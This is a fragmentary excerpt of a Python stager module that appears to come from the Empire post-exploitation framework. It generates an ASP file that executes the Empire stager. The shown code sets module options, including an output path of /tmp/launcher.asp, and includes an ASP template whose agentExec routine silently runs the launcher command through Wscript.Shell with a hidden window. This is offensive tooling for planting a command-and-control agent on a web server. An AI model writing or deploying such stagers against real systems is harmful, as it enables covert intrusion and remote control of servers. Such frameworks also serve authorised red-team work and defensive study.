...
class Stager:
    ...
    def __init__(self, mainMenu, params=[]):
        ...
        self.info = {
            ...
            'Description': ('Generates an ASP file that executes the Empire stager.'),
        ...
        self.options = {
            ...
            'OutFile' : {
                'Description'   :   'File to output ASP to, otherwise displayed on the screen.',
                'Required'      :   True,
                'Value'         :   '/tmp/launcher.asp'
            },
            'Base64' : {
...
<%
        Sub agentExec()
                launcherVar="''' + str(launcher) + '''"
                Dim shell
                Set shell = CreateObject("Wscript.Shell")
                shell.run launcherVar, 0, false
        End Sub
